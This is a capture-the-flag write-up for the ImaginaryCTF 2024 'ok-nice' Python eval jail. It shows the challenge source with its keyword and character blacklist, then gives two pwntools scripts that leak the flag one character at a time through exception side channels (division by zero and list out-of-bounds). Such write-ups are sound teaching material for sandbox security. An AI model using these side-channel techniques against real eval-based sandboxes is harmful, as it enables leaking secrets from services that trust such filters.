## ImaginaryCTF 2024 ok-nice

```python
#!/usr/bin/env python3
flag = open('flag.txt').read()

print("Welcome to the jail! It is so secure I even have a flag variable!")
blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','>','<','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']
while True:
	inp = input("Enter input: ")
	for i in blacklist:
		if i in inp:
			print("ok nice")
			exit(0)
	for i in inp:
		if (ord(i) > 125) or (ord(i) < 40) or (len(set(inp))>17):
			print("ok nice")
			exit(0)
	try:
		eval(inp,{'__builtins__':None,'ord':ord,'flag':flag})
		print("ok nice")
	except:
		print("error")
```

Requirements:

1. No numbers: Use `True` as 1
2. Exception side channel: Use integer division by zero or array out of bounds to guess each character
3. `len(set(input)) <= 17`: Reuse characters already appeared

Side channel: `1 // (ord(flag[index]) - i)` throws exception when `ord(flag[index]) == i`.

Attack script:

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "ok_nice.py"])

flag = bytearray()
for index in range(1, 40):
    flag_index = "+".join(["True"] * index)
    for i in range(0x20, 0x7F):
        p.recvuntil(b"input: ")
        minus = "-".join(["True"] * i)
        p.sendline(f"True//(ord(flag[{flag_index}])-{minus})".encode())
        res = p.recvline().strip()
        if res == b"error":
            # zero
            flag.append(i)
            break
print(flag)
```

Alternatively, learned from [official writeup](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges/blob/main/Misc/ok-nice/README.md), use array out of bounds as side channel to leak each character e.g. `[True,True][ord(flag[True])]`:

```python
from pwn import *

context(log_level="debug")

p = process(["python3", "ok_nice.py"])

flag = bytearray()
for index in range(1, 40):
    flag_index = "+".join(["True"] * index)
    for i in range(0x20, 0x7F):
        p.recvuntil(b"input: ")
        array = ",".join(["True"] * i)
        p.sendline(f"[{array}][ord(flag[{flag_index}])]".encode())
        res = p.recvline().strip()
        if res == b"ok nice":
            # no longer out of bounds
            flag.append(i - 1)
            break
print(flag)
```
